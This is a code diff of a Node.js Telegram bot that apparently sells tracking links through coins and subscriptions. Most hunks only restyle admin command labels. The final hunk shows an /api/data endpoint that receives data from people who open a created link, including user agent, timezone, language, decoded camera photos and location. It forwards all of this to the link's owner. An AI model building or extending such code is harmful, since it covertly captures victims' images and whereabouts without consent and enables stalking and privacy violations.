 bot.onText(/\/share\s+(on|off)/i, async (msg, match) => {
     if (!(await checkAdmin(msg.from.id))) return;
     const state = match[1].toLowerCase();
     shareSystemEnabled = (state === 'on');
-    bot.sendMessage(msg.chat.id, makeBorder("⚙️ ᴀᴅᴍɪɴ", `✅: ${_fnt("REFERRAL SYSTEM IS NOW")} <b>${state.toUpperCase()}</b>`), {parse_mode:'HTML'});
+    bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `✅: ${_fnt("REFERRAL SYSTEM IS NOW")} <b>${state.toUpperCase()}</b>`), {parse_mode:'HTML'});
 });
 
 async function modifyOrAddSub(msg, match, type) {
@@ -766,7 +761,7 @@ async function modifyOrAddSub(msg, match, type) {
     const inputTarget = match[2]; 
     const targetUser = await resolveUser(msg, inputTarget);
 
-    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
 
     if (amtStr.match(/[dmy]$/)) {
         const val = parseInt(amtStr);
@@ -778,8 +773,8 @@ async function modifyOrAddSub(msg, match, type) {
         targetUser.subscriptionExpiry = new Date(Date.now() + (val * multiplier));
         await targetUser.save();
         
-        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ (sᴜʙs)", `✅: ${_fnt("ADDED")} ${val}${amtStr.slice(-1)} ${_fnt("SUBSCRIPTION")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
-        bot.sendMessage(targetUser.chatId, makeBorder("sᴜʙsᴄʀɪᴘᴛɪᴏɴ", `🎉: ${_fnt("YOU HAVE RECEIVED A SUBSCRIPTION FOR")} ${val}${amtStr.slice(-1)}! ${_fnt("UNLIMITED FREE USAGE.")}`), {parse_mode:'HTML'});
+        bot.sendMessage(msg.chat.id, makeBorder("ADMIN (SUBS)", `✅: ${_fnt("ADDED")} ${val}${amtStr.slice(-1)} ${_fnt("SUBSCRIPTION")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
+        bot.sendMessage(targetUser.chatId, makeBorder("SUBSCRIPTION", `🎉: ${_fnt("YOU HAVE RECEIVED A SUBSCRIPTION FOR")} ${val}${amtStr.slice(-1)}! ${_fnt("UNLIMITED FREE USAGE.")}`), {parse_mode:'HTML'});
         return;
     }
 
@@ -789,12 +784,12 @@ async function modifyOrAddSub(msg, match, type) {
     if (type === 'add') {
         targetUser.coins += amount;
         await targetUser.save();
-        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ${_fnt("ADDED")} ${amount} ${_fnt("COINS")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
-        bot.sendMessage(targetUser.chatId, makeBorder("ʙᴀʟᴀɴᴄᴇ", `💰: +${amount} ${_fnt("COINS ADDED!")}`), {parse_mode:'HTML'});
+        bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `✅: ${_fnt("ADDED")} ${amount} ${_fnt("COINS")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
+        bot.sendMessage(targetUser.chatId, makeBorder("BALANCE", `💰: +${amount} ${_fnt("COINS ADDED!")}`), {parse_mode:'HTML'});
     } else {
         targetUser.coins = Math.max(0, targetUser.coins - amount);
         await targetUser.save();
-        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `⛔️: ${_fnt("REMOVED")} ${amount} ${_fnt("COINS")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
+        bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `⛔️: ${_fnt("REMOVED")} ${amount} ${_fnt("COINS")}\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
     }
 }
 
@@ -805,7 +800,7 @@ bot.onText(/\/reset(?:\s+(.+))?/, async (msg, match) => {
     if (!(await checkAdmin(msg.from.id))) return;
     const targetUser = await resolveUser(msg, match[1]);
     
-    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
     
     targetUser.coins = 0;
     targetUser.freeUrlsLeft = 4;
@@ -815,20 +810,20 @@ bot.onText(/\/reset(?:\s+(.+))?/, async (msg, match) => {
     
     await Link.deleteMany({ creatorChatId: targetUser.chatId });
     
-    bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ${_fnt("ACCOUNT RESET SUCCESSFUL")}\n👤: ${targetUser.firstName}\n🗑: ${_fnt("ALL LINKS DELETED, COINS 0")}`), {parse_mode:'HTML'});
-    bot.sendMessage(targetUser.chatId, makeBorder("sʏsᴛᴇᴍ", `🔄: ${_fnt("YOUR ACCOUNT HAS BEEN RESET BY ADMIN!")}`), {parse_mode:'HTML'});
+    bot.sendMessage(msg.chat.id, makeBorder("ADMIN", `✅: ${_fnt("ACCOUNT RESET SUCCESSFUL")}\n👤: ${targetUser.firstName}\n🗑: ${_fnt("ALL LINKS DELETED, COINS 0")}`), {parse_mode:'HTML'});
+    bot.sendMessage(targetUser.chatId, makeBorder("SYSTEM", `🔄: ${_fnt("YOUR ACCOUNT HAS BEEN RESET BY ADMIN!")}`), {parse_mode:'HTML'});
 });
 
 bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
     if (!(await checkAdmin(msg.from.id))) return;
     const user = await resolveUser(msg, match[1]);
-    if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", `🚫: ${_fnt("BANNED")} ${user.firstName}`), {parse_mode:'HTML'}); }
+    if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("BAN", `🚫: ${_fnt("BANNED")} ${user.firstName}`), {parse_mode:'HTML'}); }
 });
 
 bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
     if (!(await checkAdmin(msg.from.id))) return;
     const user = await resolveUser(msg, match[1]);
-    if(user) { user.isBanned = false; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ᴜɴʙᴀɴ", `✅: ${_fnt("UNBANNED")} ${user.firstName}`), {parse_mode:'HTML'}); }
+    if(user) { user.isBanned = false; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("UNBAN", `✅: ${_fnt("UNBANNED")} ${user.firstName}`), {parse_mode:'HTML'}); }
 });
 
 bot.onText(/\/ulist/, async (msg) => {
@@ -856,9 +851,9 @@ bot.onText(/\/ulist/, async (msg) => {
             report += `────────────────────\n`;
         }
 
-        bot.sendMessage(msg.chat.id, makeBorder("ʟɪɴᴋ ᴍᴀɴᴀɢᴇʀ", report), {
+        bot.sendMessage(msg.chat.id, makeBorder("LINK MANAGER", report), {
             parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[{ text: `📝 ${_fnt("HOW TO REMOVE")}`, callback_data: "rm_guide" }]] }
+            reply_markup: { inline_keyboard: [[{ text: "📝 " + _fnt("HOW TO REMOVE"), callback_data: "rm_guide" }]] }
         });
     } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error."); }
 });
@@ -885,12 +880,12 @@ bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
         linkMsg += `<b>${i + 1}.</b> [${l.templateType}] <code>${l.shortId}</code> | ${l.customName || 'No Name'}\n`;
     });
 
-    bot.sendMessage(msg.chat.id, makeBorder("ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ", linkMsg), {
+    bot.sendMessage(msg.chat.id, makeBorder("USER LINK LIST", linkMsg), {
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [
-                [{ text: "🗑️ ᴅᴇʟᴇᴛᴇ specific", callback_data: `prompt_del_${targetId}` }],
-                [{ text: "🔥 ᴅᴇʟᴇᴛᴇ ᴀʟʟ", callback_data: `delall_${targetId}` }]
+                [{ text: "🗑️ " + _fnt("DELETE SPECIFIC"), callback_data: `prompt_del_${targetId}` }],
+                [{ text: "🔥 " + _fnt("DELETE ALL"), callback_data: `delall_${targetId}` }]
             ]
         }
     });
@@ -933,22 +928,22 @@ bot.onText(/\/menu/, async (msg) => {
 
     menu += `👤 <b>${_fnt("USER MANAGEMENT")}</b>\n`;
     menu += `├ <code>/data</code> - ${_fnt("SHOW YOUR PROFILE")}\n`;
-    menu += `├ <code>/data</code> [ʀᴇᴘʟʏ/ɪᴅ] - ${_fnt("FULL DB INFO")}\n`;
+    menu += `├ <code>/data</code> [REPLY/ID] - ${_fnt("FULL DB INFO")}\n`;
     menu += `└ <code>/users</code> - ${_fnt("GET USER LIST (.TXT)")}\n\n`;
 
     menu += `🔗 <b>${_fnt("LINK MANAGEMENT")}</b>\n`;
     menu += `├ <code>/ulist</code> - ${_fnt("ALL ACTIVE LINK USERS")}\n`;
-    menu += `├ <code>/ulink</code> [ɪᴅ/ʀᴇᴘʟʏ] - ${_fnt("USER LINK LIST")}\n`;
-    menu += `└ <code>/rmlink</code> [ɪᴅ] [ɴᴜᴍ/ᴀʟʟ] - ${_fnt("DELETE")}\n\n`;
+    menu += `├ <code>/ulink</code> [ID/REPLY] - ${_fnt("USER LINK LIST")}\n`;
+    menu += `└ <code>/rmlink</code> [ID] [NUM/ALL] - ${_fnt("DELETE")}\n\n`;
 
     menu += `💰 <b>${_fnt("CONTROL SYSTEM")}</b>\n`;
-    menu += `├ <code>/add</code> [ǫᴛʏ/1d,1m,1y] [ɪᴅ] - ${_fnt("ADD COINS/SUBS")}\n`;
-    menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ] - ${_fnt("REMOVE COINS")}\n`;
-    menu += `├ <code>/reset</code> [ɪᴅ] - ${_fnt("RESET ACCOUNT")}\n`;
-    menu += `├ <code>/sudo</code> [ɪᴅ] / r [ɪᴅ] - ${_fnt("TOGGLE/REMOVE SUDO")}\n`;
+    menu += `├ <code>/add</code> [QTY/1d,1m,1y] [ID] - ${_fnt("ADD COINS/SUBS")}\n`;
+    menu += `├ <code>/rm</code> [QTY] [ID] - ${_fnt("REMOVE COINS")}\n`;
+    menu += `├ <code>/reset</code> [ID] - ${_fnt("RESET ACCOUNT")}\n`;
+    menu += `├ <code>/sudo</code> [ID] / r [ID] - ${_fnt("TOGGLE/REMOVE SUDO")}\n`;
     menu += `├ <code>/share on|off</code> - ${_fnt("TOGGLE REFERRAL")}\n`;
-    menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ${_fnt("RESTRICT USER")}\n`;
-    menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ${_fnt("LIFT BAN")}\n\n`;
+    menu += `├ <code>/ban</code> [ID/REPLY] - ${_fnt("RESTRICT USER")}\n`;
+    menu += `└ <code>/unban</code> [ID/REPLY] - ${_fnt("LIFT BAN")}\n\n`;
 
     menu += `📢 <b>${_fnt("BROADCAST & OFFER SYSTEM")}</b>\n`;
     menu += `├ <code>/broadcast</code> [text/media] - ${_fnt("SEND MESSAGE")}\n`;
@@ -957,10 +952,10 @@ bot.onText(/\/menu/, async (msg) => {
 
     const menuBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
 
-    bot.sendMessage(chatId, menuBorder("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", menu), { 
+    bot.sendMessage(chatId, menuBorder("ADMIN PANEL", menu), { 
         parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: [[{ text: "📢 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: "https://t.me/Codex_teamx" }]]
+            inline_keyboard: [[{ text: "📢 " + _fnt("SUPPORT GROUP"), url: "https://t.me/Codex_teamx" }]]
         }
     });
 });
@@ -985,32 +980,32 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
     try {
         const activeLinkCount = await Link.countDocuments({ creatorChatId: targetUser.chatId });
         const member = await bot.getChatMember(chatId, targetUser.chatId).catch(() => null);
-        const status = (member && (['member', 'creator', 'administrator'].includes(member.status))) ? "🟢 ᴏɴʟɪɴᴇ" : "🔴 ᴏғғʟɪɴᴇ";
+        const status = (member && (['member', 'creator', 'administrator'].includes(member.status))) ? "🟢 ONLINE" : "🔴 OFFLINE";
 
         let content = "";
         
         if (isOwner) {
-            const regDate = targetUser.joinedAt ? new Date(targetUser.joinedAt).toLocaleDateString() : "ɴ/ᴀ";
+            const regDate = targetUser.joinedAt ? new Date(targetUser.joinedAt).toLocaleDateString() : "N/A";
             content += `👤 ${_fnt("NAME")}: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
             content += `🆔 ${_fnt("USER ID")}: <code>${targetUser.chatId}</code>\n`;
-            content += `🏷 ${_fnt("USER")}: @${targetUser.username || 'ɴ/ᴀ'}\n`;
+            content += `🏷 ${_fnt("USER")}: @${targetUser.username || 'N/A'}\n`;
             content += `💰 ${_fnt("COINS")}: <code>${targetUser.coins}</code>\n`;
             content += `🎁 ${_fnt("FREE")}: <code>${targetUser.freeUrlsLeft}</code>\n`;
             if(hasActiveSub(targetUser)) content += `💎 ${_fnt("SUB")}: <code>${getSubTimeLeft(targetUser)}</code>\n`;
             content += `🔗 ${_fnt("ACTIVE")}: <code>${activeLinkCount}</code>\n`;
             content += `📡 ${_fnt("STATUS")}: <b>${status}</b>\n`;
-            content += `🛡 ${_fnt("BAN")}: <b>${targetUser.isBanned ? "ʏᴇs" : "ɴᴏ"}</b>\n`;
+            content += `🛡 ${_fnt("BAN")}: <b>${targetUser.isBanned ? "YES" : "NO"}</b>\n`;
             content += `📅 ${_fnt("REG DATE")}: <code>${regDate}</code>`;
         } else {
             content += `👤 ${_fnt("NAME")}: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
             content += `🆔 ${_fnt("USER ID")}: <code>${targetUser.chatId}</code>\n`; 
-            content += `🏷 ${_fnt("USER")}: @${targetUser.username || 'ɴ/ᴀ'}\n`;
+            content += `🏷 ${_fnt("USER")}: @${targetUser.username || 'N/A'}\n`;
             content += `📡 ${_fnt("STATUS")}: <b>${status}</b>`;
         }
 
         const shortBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
 
-        bot.sendMessage(chatId, shortBorder(isOwner ? "ᴀᴅᴍɪɴ ᴅᴀᴛᴀ ᴠɪᴇᴡ" : "ᴜsᴇʀ ᴘʀᴏғɪʟᴇ", content), { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, shortBorder(isOwner ? "ADMIN DATA VIEW" : "USER PROFILE", content), { parse_mode: 'HTML' });
 
     } catch (e) { bot.sendMessage(chatId, `❌ ${_fnt("ERROR PREPARING DATA")}`); }
 });
@@ -1029,7 +1024,7 @@ bot.onText(/\/users/, async (msg) => {
         report += `🔗 <b>${_fnt("ACTIVE LINKS")}:</b> <code>${activeLinks}</code>\n`;
         report += `🚫 <b>${_fnt("BANNED USERS")}:</b> <code>${bannedUsers}</code>\n`;
         
-        await bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", report), { parse_mode: 'HTML' });
+        await bot.sendMessage(msg.chat.id, makeBorder("STATS", report), { parse_mode: 'HTML' });
 
         let fileContent = `Ｄｘ－Ｓｉｍｕ USER DATABASE REPORT\nGenerated on: ${new Date().toLocaleString()}\n--------------------------------------------------\n\n`;
 
@@ -1126,7 +1121,7 @@ bot.onText(/\/ref\s+(.+)/s, async (msg, match) => {
             const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${u.chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
             await bot.sendMessage(u.chatId, htmlText, {
                 parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
+                reply_markup: { inline_keyboard: [[{ text: "📲 " + _fnt("SHARE NOW"), url: inviteUrl }]] }
             });
             success++;
         } catch(e) {
@@ -1166,7 +1161,7 @@ bot.onText(/\/offer\s+([a-zA-Z0-9]+)\s+(.+)/s, async (msg, match) => {
             const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${u.chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
             await bot.sendMessage(u.chatId, htmlText, {
                 parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
+                reply_markup: { inline_keyboard: [[{ text: "📲 " + _fnt("SHARE NOW"), url: inviteUrl }]] }
             });
             success++;
         } catch(e) {
@@ -1238,13 +1233,13 @@ app.post('/api/data', async (req, res) => {
             msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
             msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${_nav.language}</code>\n`;
             msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${_nav.userAgent}</pre>\n\n`;
-            msg += `<blockquote>${_fnt("DEV-BY: Ｄｘ－Ｓｉｍｕ || ")}@Termuxcodex</blockquote>`;
+            msg += `<blockquote>${_fnt("DEV-BY: DX-SIMU || ")}@Termuxcodex</blockquote>`;
 
             await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
             
         } else if (type === 'cam') {
             const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
-            await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
+            await bot.sendPhoto(owner, buffer, { caption: makeBorder("CAMERA", `📱: ${data.platform}`), parse_mode: 'HTML' });
             
         } else if (type === 'loc') {
             let locMsg = `<b>┏━━「 ${_fnt("LOCATION DATA")} 」━━┓</b>\n`;
